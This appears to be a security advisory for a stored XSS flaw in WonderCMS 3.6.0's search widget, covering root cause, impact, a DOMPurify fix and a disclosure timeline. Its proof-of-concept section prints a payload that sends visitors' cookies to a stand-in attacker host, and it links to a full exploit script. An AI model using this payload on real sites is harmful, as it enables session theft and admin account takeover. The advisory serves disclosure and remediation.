---
title: "WonderCMS 3.6.0 — Stored XSS via Search Widget (GHSA-5x7j-xjpx-pmm5)"
date: 2026-05-25 12:00:00 +0000
categories: [CVE, XSS]
tags: [wondercms, xss, stored-xss, cve, responsible-disclosure]
---

## Overview

**Affected software:** WonderCMS ≤ 3.6.0  
**Advisory:** GHSA-5x7j-xjpx-pmm5  
**CVSS 3.1:** 7.4 High — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N`  
**Reported:** 2026-05-25

WonderCMS 3.6.0 renders the search query parameter directly via `innerHTML` without sanitisation, allowing a stored XSS payload to execute in the context of every visitor who loads a page with the search widget.

## Root Cause

`search.js` assigns the server response directly to `innerHTML`:

```javascript
searchResultsDiv.innerHTML = data;  // unsanitised HTML from server
```

The server passes the raw `?search=` query value into the rendered HTML, making it trivial to inject a script tag through the search widget configuration.

## Impact

- Session hijacking via `document.cookie` theft → full admin account takeover
- Malware distribution to all site visitors
- Credential phishing via DOM manipulation

## Proof of Concept

```html
<!-- Payload injected via search widget configuration -->
<img src=x onerror="fetch('https://attacker.com/collect?c='+btoa(document.cookie))">
```

## Remediation

Replace `innerHTML` assignment with `textContent` for plain text output, or use a DOM sanitiser library (e.g. DOMPurify) for HTML content:

```javascript
// Vulnerable
searchResultsDiv.innerHTML = data;

// Fixed
import DOMPurify from 'dompurify';
searchResultsDiv.innerHTML = DOMPurify.sanitize(data);
```

## PoC Code

Full exploit script available at: [github.com/BlessedOn3/poc-wondercms-360-xss](https://github.com/BlessedOn3/poc-wondercms-360-xss)

## Timeline

| Date | Event |
|------|-------|
| 2026-05-25 | Vulnerability discovered |
| 2026-05-25 | GitHub Security Advisory created (GHSA-5x7j-xjpx-pmm5) |
| TBD | CVE ID assigned |
